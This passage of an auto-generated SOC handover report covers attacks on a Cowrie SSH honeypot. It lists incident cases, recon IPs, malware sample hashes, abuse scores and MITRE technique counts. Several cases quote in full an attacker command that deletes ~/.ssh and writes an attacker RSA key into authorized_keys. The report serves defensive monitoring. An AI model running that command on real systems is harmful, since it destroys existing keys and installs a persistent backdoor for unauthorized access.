| `2026-04-24 17:54:27` | `cowrie.client.version` |
| `2026-04-24 17:54:27` | `cowrie.client.kex` |
| `2026-04-24 17:54:27` | `cowrie.login.success` |
| `2026-04-24 17:54:27` | `cowrie.session.params` |
| `2026-04-24 17:54:27` | `cowrie.command.input` |
| `2026-04-24 17:54:27` | `cowrie.command.failed` |
| `2026-04-24 17:54:27` | `cowrie.log.closed` |
| `2026-04-24 17:54:27` | `cowrie.session.params` |
| `2026-04-24 17:54:27` | `cowrie.command.input` |
| `2026-04-24 17:54:27` | `cowrie.session.file_download` |
| `2026-04-24 17:54:27` | `cowrie.log.closed` |
| `2026-04-24 17:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b6ef906695c

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:54 |
| **Last Seen** | 2026-04-24 17:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:54:29` | `cowrie.session.connect` |
| `2026-04-24 17:54:29` | `cowrie.client.version` |
| `2026-04-24 17:54:29` | `cowrie.client.kex` |
| `2026-04-24 17:54:29` | `cowrie.login.success` |
| `2026-04-24 17:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e02dddb4f06

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:58 |
| **Last Seen** | 2026-04-24 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:58:56` | `cowrie.session.connect` |
| `2026-04-24 17:58:56` | `cowrie.client.version` |
| `2026-04-24 17:58:56` | `cowrie.client.kex` |
| `2026-04-24 17:58:56` | `cowrie.login.success` |
| `2026-04-24 17:58:56` | `cowrie.session.params` |
| `2026-04-24 17:58:56` | `cowrie.command.input` |
| `2026-04-24 17:58:56` | `cowrie.command.failed` |
| `2026-04-24 17:58:56` | `cowrie.log.closed` |
| `2026-04-24 17:58:56` | `cowrie.session.params` |
| `2026-04-24 17:58:56` | `cowrie.command.input` |
| `2026-04-24 17:58:56` | `cowrie.session.file_download` |
| `2026-04-24 17:58:56` | `cowrie.log.closed` |
| `2026-04-24 17:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3888c0f7149e

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 17:58 |
| **Last Seen** | 2026-04-24 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 17:58:57` | `cowrie.session.connect` |
| `2026-04-24 17:58:57` | `cowrie.client.version` |
| `2026-04-24 17:58:57` | `cowrie.client.kex` |
| `2026-04-24 17:58:58` | `cowrie.login.success` |
| `2026-04-24 17:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f106034b34af

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 18:04 |
| **Last Seen** | 2026-04-24 18:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 18:04:16` | `cowrie.session.connect` |
| `2026-04-24 18:04:16` | `cowrie.client.version` |
| `2026-04-24 18:04:16` | `cowrie.client.kex` |
| `2026-04-24 18:04:16` | `cowrie.login.success` |
| `2026-04-24 18:04:16` | `cowrie.session.params` |
| `2026-04-24 18:04:16` | `cowrie.command.input` |
| `2026-04-24 18:04:16` | `cowrie.command.failed` |
| `2026-04-24 18:04:16` | `cowrie.log.closed` |
| `2026-04-24 18:04:16` | `cowrie.session.params` |
| `2026-04-24 18:04:16` | `cowrie.command.input` |
| `2026-04-24 18:04:16` | `cowrie.session.file_download` |
| `2026-04-24 18:04:16` | `cowrie.log.closed` |
| `2026-04-24 18:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-612a6afdd72d

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 18:04 |
| **Last Seen** | 2026-04-24 18:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 18:04:18` | `cowrie.session.connect` |
| `2026-04-24 18:04:18` | `cowrie.client.version` |
| `2026-04-24 18:04:18` | `cowrie.client.kex` |
| `2026-04-24 18:04:18` | `cowrie.login.success` |
| `2026-04-24 18:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-431110b2614a

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 18:10 |
| **Last Seen** | 2026-04-24 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 18:10:14` | `cowrie.session.connect` |
| `2026-04-24 18:10:14` | `cowrie.client.version` |
| `2026-04-24 18:10:14` | `cowrie.client.kex` |
| `2026-04-24 18:10:14` | `cowrie.login.success` |
| `2026-04-24 18:10:14` | `cowrie.session.params` |
| `2026-04-24 18:10:14` | `cowrie.command.input` |
| `2026-04-24 18:10:14` | `cowrie.command.failed` |
| `2026-04-24 18:10:14` | `cowrie.log.closed` |
| `2026-04-24 18:10:14` | `cowrie.session.params` |
| `2026-04-24 18:10:14` | `cowrie.command.input` |
| `2026-04-24 18:10:14` | `cowrie.session.file_download` |
| `2026-04-24 18:10:14` | `cowrie.log.closed` |
| `2026-04-24 18:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ebb230fe27b

| Field | Detail |
|---|---|
| **Source IP** | `122.170.115[.]173` |
| **First Seen** | 2026-04-24 18:10 |
| **Last Seen** | 2026-04-24 18:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 18:10:15` | `cowrie.session.connect` |
| `2026-04-24 18:10:15` | `cowrie.client.version` |
| `2026-04-24 18:10:15` | `cowrie.client.kex` |
| `2026-04-24 18:10:15` | `cowrie.login.success` |
| `2026-04-24 18:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.115[.]173` to AbuseIPDB if not already reported
- [ ] Block `122.170.115[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f987f6ac3dc

| Field | Detail |
|---|---|
| **Source IP** | `44.32.81[.]28` |
| **First Seen** | 2026-04-24 18:21 |
| **Last Seen** | 2026-04-24 18:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 18:21:32` | `cowrie.session.connect` |
| `2026-04-24 18:21:32` | `cowrie.client.version` |
| `2026-04-24 18:21:33` | `cowrie.client.kex` |
| `2026-04-24 18:21:34` | `cowrie.login.success` |
| `2026-04-24 18:21:35` | `cowrie.session.params` |
| `2026-04-24 18:21:35` | `cowrie.command.input` |
| `2026-04-24 18:21:35` | `cowrie.command.failed` |
| `2026-04-24 18:21:36` | `cowrie.log.closed` |
| `2026-04-24 18:21:37` | `cowrie.session.params` |
| `2026-04-24 18:21:37` | `cowrie.command.input` |
| `2026-04-24 18:21:37` | `cowrie.session.file_download` |
| `2026-04-24 18:21:37` | `cowrie.log.closed` |
| `2026-04-24 18:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `44.32.81[.]28` to AbuseIPDB if not already reported
- [ ] Block `44.32.81[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb171af416fa

| Field | Detail |
|---|---|
| **Source IP** | `44.32.81[.]28` |
| **First Seen** | 2026-04-24 18:21 |
| **Last Seen** | 2026-04-24 18:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 18:21:41` | `cowrie.session.connect` |
| `2026-04-24 18:21:41` | `cowrie.client.version` |
| `2026-04-24 18:21:42` | `cowrie.client.kex` |
| `2026-04-24 18:21:44` | `cowrie.login.success` |
| `2026-04-24 18:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `44.32.81[.]28` to AbuseIPDB if not already reported
- [ ] Block `44.32.81[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.78.1[.]33` | **27** | 2026-04-24 17:01 | 2026-04-24 17:47 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.248.83[.]33` | **27** | 2026-04-24 17:15 | 2026-04-24 17:50 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.244.141[.]86` | **27** | 2026-04-24 17:04 | 2026-04-24 17:39 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.35[.]131` | **25** | 2026-04-24 18:38 | 2026-04-24 18:44 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `122.170.115[.]173` | **18** | 2026-04-24 17:07 | 2026-04-24 18:11 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.93.19[.]12` | **4** | 2026-04-24 17:02 | 2026-04-24 17:08 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `102.219.126[.]124` | 1 | 2026-04-24 17:15 | 2026-04-24 17:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.142.26[.]46` | 1 | 2026-04-24 17:09 | 2026-04-24 17:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.61.122[.]229` | 1 | 2026-04-24 18:35 | 2026-04-24 18:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.82.37[.]34` | 1 | 2026-04-24 17:28 | 2026-04-24 17:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-04-24 17:26 | 2026-04-24 17:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]73` | 1 | 2026-04-24 17:18 | 2026-04-24 17:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.130.57[.]128` | 1 | 2026-04-24 17:46 | 2026-04-24 17:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `44.220.188[.]54` | 1 | 2026-04-24 17:57 | 2026-04-24 17:57 | 5s | 0 | `T1592` | 🟢 LOW |
| `44.32.81[.]28` | 1 | 2026-04-24 18:21 | 2026-04-24 18:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.123.35[.]131` | PK | CMPak Limited | **100** ⚠️ | 2 |
| `122.170.115[.]173` | IN | ABTS-MUMBAI | **100** ⚠️ | 4 |
| `44.32.81[.]28` | TH | Amateur Radio Digital Communications | **100** ⚠️ | 2 |
| `115.93.19[.]12` | KR | LG DACOM Corporation | **100** ⚠️ | 6 |
| `103.78.1[.]33` | VN | ROYAL TECHNOLOGY MEDIA JOINT STOCK COMPANY | **100** ⚠️ | 18 |
| `103.82.37[.]34` | VN | CLOUDFLY CORPORATION | **100** ⚠️ | 50 |
| `14.248.83[.]33` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 6 |
| `103.142.26[.]46` | VN | Tino Group Joint Stock Company | **100** ⚠️ | 33 |
| `103.61.122[.]229` | VN | H2 VIET NAM TECHNOLOGY SOLUTIONS COMPANY LIMITED | **100** ⚠️ | 50 |
| `120.241.79[.]66` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 198 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 108 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 88 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 44 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 44 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 229 cases |
| Tool 34  | Credential Extractor        | ✅ 196 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (1.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 88 priority case(s) shown individually · 15 recon entry/entries in table (6 group(s) consolidating 128 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-24T18:59:48Z_
